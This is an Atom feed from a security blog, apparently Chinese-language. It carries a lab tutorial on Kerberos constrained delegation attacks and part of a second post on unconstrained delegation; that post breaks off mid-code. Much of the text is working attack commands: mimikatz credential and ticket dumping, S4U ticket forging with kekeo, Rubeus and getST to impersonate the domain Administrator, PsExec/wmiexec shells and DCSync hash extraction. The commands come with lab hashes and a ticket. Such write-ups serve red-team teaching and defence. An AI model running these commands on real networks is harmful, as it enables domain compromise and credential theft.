<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chen&#39;Blog</title>
  
  <subtitle>Life has its own fate, and meeting may not be accidental.</subtitle>
  <link href="https://chenzidu.github.io/atom.xml" rel="self"/>
  
  <link href="https://chenzidu.github.io/"/>
  <updated>2023-02-24T08:55:53.197Z</updated>
  <id>https://chenzidu.github.io/</id>
  
  <author>
    <name>ChenZIDu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>约束性委派利用</title>
    <link href="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/"/>
    <id>https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/</id>
    <published>2023-02-24T07:41:31.000Z</published>
    <updated>2023-02-24T08:55:53.197Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议<code>S4u2self（Service for User to Self）</code>和<code>S4U2proxy（Service for User to Proxy）</code>。<br>约束委派有两种：</p><blockquote><ol><li>仅使用Kerberos，不能进行协议转换</li><li>使用任何身份验证协议</li></ol></blockquote><a id="more"></a><h3 id="S4u2self-amp-S4U2proxy"><a href="#S4u2self-amp-S4U2proxy" class="headerlink" title="S4u2self &amp; S4U2proxy"></a>S4u2self &amp; S4U2proxy</h3><p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据；<br><code>S4U2proxy</code>协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据；<br>    约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务。<br>配置了约束性委派的账户属性会有如下两个变化：</p><blockquote><ol><li>账户<code>userAccountControl</code>属性设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>标志位，值<code>16781312</code>。</li><li>账户<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务。</li></ol></blockquote><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">域名: redteam.com</span><br><span class="line">域控: </span><br><span class="line">    操作系统: Windows<span class="built_in"> Server </span>2016</span><br><span class="line">主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.10</span><br><span class="line"></span><br><span class="line">    主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.11</span><br><span class="line">域内主机:</span><br><span class="line">    操作系统: Windows<span class="built_in"> server </span>2012</span><br><span class="line">    主机名: web-2012</span><br><span class="line">    IP: 10.10.10.12</span><br><span class="line">攻击机:</span><br><span class="line">    操作系统: win 10</span><br><span class="line">    IP: 10.10.10.22</span><br></pre></td></tr></table></figure><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p><strong>机器账户</strong><br>活动目录中的computers组内的计算机，也被称为机器账号。<br><strong>服务账户</strong><br>域账户注册SPN成为服务账户</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red saulgoodman #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red web<span class="number">-2012</span> #web<span class="number">-2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web<span class="number">-2012.</span>redteam.red</span><br></pre></td></tr></table></figure><p>域账户变成服务账户后会有委派，仅信任此用户作为指定服务的委派 -&gt; 添加想要委派的服务。</p><p><img src="1.png" alt="image.png"></p><h2 id="约束委派服务账户特征"><a href="#约束委派服务账户特征" class="headerlink" title="约束委派服务账户特征"></a><strong>约束委派服务账户特征</strong></h2><p> 配置了约束性委派的账户属性会有如下两个变化。<br>账户 userAccountControl 属性会被设置为TRUSTED_TO_AUTH_FOR_DELEGATION 标志位，账户 msDS-AllowedToDelegateTo 属性，添加允许委派的服务。<br><img src="2.png" alt="image.png"></p><h2 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h2><h4 id="方法1：ADFind"><a href="#方法1：ADFind" class="headerlink" title="方法1：ADFind"></a>方法1：ADFind</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派机器账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派服务账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="3.png" alt="image.png"></p><h4 id="方法2：SharpView"><a href="#方法2：SharpView" class="headerlink" title="方法2：SharpView"></a>方法2：SharpView</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerView查询约束委派机器账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainComputer -TrustedToAuth -Doamin redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto </span>-AutoSize</span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView查询约束委派服务账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainUser –TrustedToAuth -Domain redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span></span><br></pre></td></tr></table></figure><p><img src="4.png" alt="image.png"></p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：使用机器账户的票据-kekeo"><a href="#方法1：使用机器账户的票据-kekeo" class="headerlink" title="方法1：使用机器账户的票据 | kekeo"></a>方法1：使用机器账户的票据 | kekeo</h4><p>约束性委派攻击的关键就是<strong>获得可转发的服务票据ST</strong>，获取根据约束性委派的执行过程可知，只要<strong>控制配置约束性委派服务的机器，并获得了它的密码</strong>，那么我们就可以劫持这台主机的kerberos请求过程，最终获得任意用户权限的ticket，利用条件：</p><blockquote><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol></blockquote><p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>工具导出<code>lsass.exe</code>进程中所有的票据，得到想要的服务票据</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="5.png" alt="image.png"></p><p>使用kekeo工具申请服务票据（S4U2Proxy协议）</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请服务票据</span></span><br><span class="line">.<span class="string">\kekeo.exe</span> <span class="string">"tgs::s4u /tgt:[0;3e7]-2-1-40e10000-web-2012$@krbtgt-REDTEAM.COM.kirbi /user:Administrator@redteam.COM /service:cifs/ad01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"kerberos::ptt TGS_Administrator@redteam.com@REDTEAM.COM_cifs~ad01-2016.redteam.com@REDTEAM.com.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir <span class="string">\\ad01-2016.redteam.com\c$</span></span><br><span class="line"></span><br><span class="line">.<span class="string">\Psexec.exe</span> -accepteula <span class="string">\\ad01-2016.redteam.red</span> cmd</span><br></pre></td></tr></table></figure><h4 id="方法2：使用机器账户的Hash值-Rubeus"><a href="#方法2：使用机器账户的Hash值-Rubeus" class="headerlink" title="方法2：使用机器账户的Hash值 | Rubeus"></a>方法2：使用机器账户的Hash值 | Rubeus</h4><p>与思路一类似，但是这里使用的是Hash值，利用条件：</p><blockquote><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol></blockquote><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 使用mimikatz获取机器账户NTLM Hash</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p>使用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>申请访问自身的可转发服务票据</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用Rubeus申请配置了约束委派机器账户web<span class="number">-2012</span>$的TGT</span><br><span class="line">.\Rubeus.exe asktgt /user:WEB<span class="number">-2012</span>$ /rc4:<span class="number">40</span>ee25b2c3f7ac3370429b18aca51e81 /domain:redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /nowrap</span><br><span class="line"></span><br><span class="line"># 使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存</span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:ldap/ad02<span class="number">-2016.</span>redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /ptt /ticket:doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQ0bC1JFRFRFQU0uUkVEoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZKOCA88wggPLoAMCARKhAwIBAqKCA70EggO5H/WWv61D37Lh8CgUrZXK+OCIcG1ppRSAswcwQuaD4XOCz+v9+wZRJ6xY1DRAQ7HK0fIrp96Z54o0al1nMCGXkKRrq4+UyiTuDABdCUxj/bKj0m/DanX6Bm82LFah0J8CRpFsbt5i1F0U/<span class="number">0</span>t79e8lGbWqmTajaeTgYQrLFmWMUTL8+DQ7E02wth14UY/rBBF/oDwdVhoFovwvkjSiLYx3ePyX20Gmz8IH+<span class="number">1</span>ReqZajI8I4FGn1fV6FSzlUI7eWMumOkV61iV3uW1Zw7OqawRTcbx/<span class="number">33</span>rBjkpKsBCY0Gx41q63a8HiLua1tJZkJOERmUWjr/<span class="number">7</span>EZeZ+RbcgvDT3yOGD1L0y2iHTnGk1+maS3Rbee7EtERg4RmSwXUMnoRsle6/oVFyVdGhpbf8ePiCUY1IQCLNIt7YcleNljrOxSZwPIH1lBwIxiRNrgyhnJbcFKhroZg+dbITKaZYP1j1jcOdlpA2t5qF/kgIcuTSyz7E8bMvm+<span class="number">34</span>TwLjOF+bw+<span class="number">5</span>O3riugezUL0nhZRxxZGYfixtOLTN+wxLfDOvqzBbE9HOSJJOeoxGsktl8y5ULQ1cSxEyYjklxlMrv8/t2jJKJE60VrJS+f+VhYw0de+<span class="number">6</span>AJ08aSWJrfAQQ6T9aAyBFr+flOnx93aIYb5ql6W5rZ9Q5OKDcms/<span class="number">1</span>rIzVDoPdB2ZAQxPkquHB8vFAXO86rKw1k1SauMxn8sOFVdocF56eWHIEUegVe4mpGLipQMTMJnFCGhuq1IlLZbPTnFykDM9cR+FZb3d5uUN45BGIS2TEKtie6yBROP5mX3F6273srlBM/XOgOUXPnradx1RUPJ2zEM9L8PYKKm516wTJLirmAYRI4FSdQ3hHuMLeTrHNE8BggLf1AhTQizCf7iUJFf7hJv09gIugLFNXtqakKFeAnxz7Ej+X9Q3xyaR39IBIKPrtd/ChkbDZYiID9n31sGQ4oTyYEQDoef4zIhq/x3qRxeroCFKG4yRdVKo8eBEq4a5TPuHIbstXO<span class="comment">//3ZAcxFmK8Kcs+PHbkgyDyGiLdhf2GjnGDtBL1Hj4nJHVCXZR49XNhpCKY2iG/JkVq0RFoxn1X06BY7WcMQybIoXeD0jjXrEQn7Qh6xe6SsRsu5YU0npq8TBEcI6F3wtzGZX9KMLnHIRRfcsBlCLi5LOgIl/byAkR/ImxzlhVi/TxDn1p3kDOj+qHzcayOm0SBzr4kES/T6DCsoSCaeAYUzR5CSn4hnEtTzoTJGmAgR602Hp2HymQSfjlQQk9rqPiZCGLg7i+3GjgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCrZ+acKyJr6OeDK5YKeYM0oQ0bC1JFRFRFQU0uUkVEohYwFKADAgEBoQ0wCxsJV0VCLTIwMTIkowcDBQBA4QAApREYDzIwMjMwMjA3MDgzOTM4WqYRGA8yMDIzMDIwNzE4MzkzOFqnERgPMjAyMzAyMTQwODM5MzhaqA0bC1JFRFRFQU0uUkVEqSAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZA==</span></span><br><span class="line"></span><br><span class="line"># 直接dir</span><br><span class="line">dir \\ad02<span class="number">-2016.</span>redteam.red\c$</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="image.png"></p><h4 id="方法3：使用机器账户的Hash值-getST"><a href="#方法3：使用机器账户的Hash值-getST" class="headerlink" title="方法3：使用机器账户的Hash值 | getST"></a>方法3：使用机器账户的Hash值 | getST</h4><p>同思路2一致，也是使用机器账户的Hash值，但这里使用Impacket工具套件中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py" target="_blank" rel="noopener">getST.py</a>脚本请求服务票据，并利用该脚本通过<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a>工具远程登录<br>利用条件：</p><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz获取机器账户NTLM Hash值</span><br><span class="line">mimikatz.<span class="keyword">exe</span> <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"># 使用getST申请服务票据</span><br><span class="line">.\getST.<span class="keyword">exe</span> -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -spn cifs/ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -impersonate administrator redteam.<span class="keyword">com</span>/web-<span class="number">2012</span>$ -hashes :<span class="number">1</span>d01ff5cd4825306ff1a7599204525ec</span><br><span class="line"></span><br><span class="line"># 使用票据远程访问</span><br><span class="line"><span class="keyword">set</span> KRB5CCNAME=administrator.ccache </span><br><span class="line">.\wmiexec.<span class="keyword">exe</span> -<span class="keyword">k</span> redteam.<span class="keyword">com</span>/administrator@ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -<span class="keyword">no</span>-pass -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -codec gbk</span><br></pre></td></tr></table></figure><img src="7.png" alt="image.png"></li></ol><h4 id="方法4：使用机器账户的Hash值-kekeo"><a href="#方法4：使用机器账户的Hash值-kekeo" class="headerlink" title="方法4：使用机器账户的Hash值 | kekeo"></a>方法4：使用机器账户的Hash值 | kekeo</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:web-2012$ /domain:redteam.red /NTLM:40ee25b2c3f7ac3370429b18aca51e81"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请administrator权限的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgs::s4u /tgt:TGT_web-2012$@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:ldap/ad02-2016.redteam.red"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## kekeo注入票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@redteam.red_ldap~ad02-2016.redteam.red@redteam.red.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz通过ldap服务导出hash</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_ldap~ad02-2016.redteam.red@REDTEAM.RED.kirbi"</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir \\ad02-<span class="number">2016</span>.redteam.red\c$</span><br><span class="line"></span><br><span class="line"><span class="comment"># psexec</span></span><br><span class="line">.\Psexec.exe -accepteula \\ad02-<span class="number">2016</span>.redteam.red cmd</span><br></pre></td></tr></table></figure><p><img src="8.png" alt="image.png"><br>ldap账户<br><img src="9.png" alt="image.png"></p><h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><blockquote><p>域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p></blockquote><h4 id="方法1：使用服务账户的票据-kekeo"><a href="#方法1：使用服务账户的票据-kekeo" class="headerlink" title="方法1：使用服务账户的票据 | kekeo"></a>方法1：使用服务账户的票据 | kekeo</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 通过<span class="selector-tag">kekeo</span>请求服务用户的<span class="selector-tag">TGT</span></span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:saulgoodman</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.red</span> /<span class="selector-tag">password</span><span class="selector-pseudo">:Saul</span>!@<span class="selector-id">#456</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:test.kirbi</span></span><br><span class="line"></span><br><span class="line">## 同理此处利用<span class="selector-tag">ntlm</span> <span class="selector-tag">hash</span>也是可以进行请求的</span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:websec</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.club</span> /<span class="selector-tag">NTLM</span><span class="selector-pseudo">:XXXXX</span></span><br></pre></td></tr></table></figure><p><img src="10.png" alt="image.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用票据通过伪造S4U请求以administrator身份访问websec的ST</span></span><br><span class="line">tgs::s4u /<span class="symbol">tgt:</span>TGT_saulgoodman<span class="variable">@REDTEAM</span>.RED_krbtgt~redteam.red<span class="variable">@REDTEAM</span>.RED.kirbi /<span class="symbol">user:</span>Administrator<span class="variable">@redteam</span>.red /<span class="symbol">service:</span>cifs/AD02<span class="number">-2016</span>.redteam.red</span><br></pre></td></tr></table></figure><p><img src="11.png" alt="image.png"></p><p>kekeo当前路径下会出现administrator的ticket (用于访问saulgoodman的CIFS服务), 访问saulgoodman的cifs服务: 使用kekeo导入票据访问域控。<br><strong>cifs服务</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## kekeo导入这个tiket</span></span><br><span class="line">kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD02-<span class="number">2016.redteam</span>.red@REDTEAM.RED.kirbi</span><br><span class="line"></span><br><span class="line"><span class="comment">## cmd</span></span><br><span class="line">.<span class="string">\PsExec.exe</span> <span class="string">\\ad02-2016.redteam.red</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="comment">## dir</span></span><br><span class="line">dir <span class="string">\\ad02-2016.redteam.red\c$</span></span><br></pre></td></tr></table></figure><p><img src="12.png" alt="image.png"></p><p><img src="13.png" alt="image.png"></p><p><strong>ldap服务</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## <span class="selector-tag">mimikatz</span>导入<span class="selector-tag">ptt</span></span><br><span class="line"><span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">TGS_Administrator</span><span class="keyword">@redteam</span>.red<span class="keyword">@REDTEAM</span>.RED_cifs~AD02-2016.redteam.red<span class="keyword">@REDTEAM</span>.RED.kirbi</span><br><span class="line"></span><br><span class="line">## mimikatz不用本机管理员，导入kiket即可不用 <span class="string">"privilege::debug"</span></span><br><span class="line"><span class="attribute">lsadump:</span>:dcsync /<span class="attribute">domain:</span>redteam.com /all /csv</span><br></pre></td></tr></table></figure><p><img src="14.png" alt="image.png"></p><p><img src="15.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议&lt;code&gt;S4u2self（Service for User to Self）&lt;/code&gt;和&lt;code&gt;S4U2proxy（Service for User to Proxy）&lt;/code&gt;。&lt;br&gt;约束委派有两种：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;仅使用Kerberos，不能进行协议转换&lt;/li&gt;
&lt;li&gt;使用任何身份验证协议&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="委派" scheme="https://chenzidu.github.io/categories/%E5%A7%94%E6%B4%BE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>非约束性委派</title>
    <link href="https://chenzidu.github.io/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/"/>
    <id>https://chenzidu.github.io/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/</id>
    <published>2023-02-23T03:31:09.000Z</published>
    <updated>2023-02-24T08:57:33.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户<strong>访问任意服务。</strong><br>如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务。</p><a id="more"></a><p><img src="1.png" alt="image.png"></p><ol><li>用户向KDC请求可转发TGT，记为TGT1</li><li>KDC返回TGT1</li><li>用户通过TGT1向KDC请求转发TGT2</li><li>KDC返回TGT2</li><li>用户通过TGT1向KDC申请访问服务1的RST</li><li>KDC返回RST</li><li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li><li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li><li>KDC给服务1返回服务2的RST</li><li>服务1以用户名义向服务2发出请求</li><li>服务2响应服务1的请求</li><li>服务1响应用户第7步骤的请求</li></ol><p>这个流程的问题在于：<strong>TGT2不被限制，服务1完全可以用它来请求访问任何想访问的服务。</strong> 攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p><h2 id="配置非约束委派"><a href="#配置非约束委派" class="headerlink" title="配置非约束委派"></a>配置非约束委派</h2><h3 id="机器账户配置"><a href="#机器账户配置" class="headerlink" title="机器账户配置"></a>机器账户配置</h3><p><img src="2.png" alt="image.png"></p><h3 id="服务账户配置"><a href="#服务账户配置" class="headerlink" title="服务账户配置"></a>服务账户配置</h3><p>域账户注册SPN成为服务账户</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/win10<span class="selector-class">.redteam</span><span class="selector-class">.red</span> susan #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web-<span class="number">2012</span><span class="selector-class">.redteam</span><span class="selector-class">.red</span> web-<span class="number">2012</span> #web-<span class="number">2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web-<span class="number">2012</span><span class="selector-class">.redteam</span>.red</span><br></pre></td></tr></table></figure><p><img src="3.png" alt="image.png"></p><h2 id="侦察手段"><a href="#侦察手段" class="headerlink" title="侦察手段"></a>侦察手段</h2><blockquote><p>当服务账号或主机被设置为非约束性委派时，其userAccountControl属性会包含TRUSTED_FOR_DELEGATION，而TRUSTED_FOR_DELEGATION的标志位，对应的值是0x80000，也即是524288。当前账户值为66048，而590336-66048=524288</p></blockquote><p><img src="4.png" alt="image.png"></p><h3 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询非约束机器账户</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=red"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">dn</span></span><br><span class="line"> </span><br><span class="line"># 查询非约束委派服务账户</span><br><span class="line">.\AdFind.exe -<span class="keyword">b </span><span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">dn</span></span><br></pre></td></tr></table></figure><h3 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查找非约束机器账户</span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> redteam.com -DomainController AD01<span class="number">-2016</span></span><br><span class="line"></span><br><span class="line">.\SharpView.exe <span class="keyword">Get</span>-NetComputer -<span class="keyword">Filter</span> "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -DomainController AD01<span class="number">-2016</span></span><br><span 